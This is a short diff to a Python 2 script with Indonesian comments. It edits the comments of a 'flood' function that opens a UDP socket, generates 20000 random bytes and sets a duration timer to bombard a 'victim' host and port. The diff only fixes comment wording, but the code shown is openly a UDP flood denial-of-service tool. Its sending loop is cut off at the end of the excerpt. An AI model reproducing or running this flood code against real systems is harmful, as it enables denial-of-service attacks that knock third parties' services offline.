@@ -20,9 +20,9 @@ def usage():
     print "                     @@@@@@@@@@@@@@@@"
 def flood(victim, vport, duration):
     # Tancap gas langsung :(
-    # Whatas up? jai disni perangkat ini akan memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    # Whats up? jai disni perangkat ini akan memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 20000 representasi satu byte ke server
+    # 20000 representasi satu byte ke target/server
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
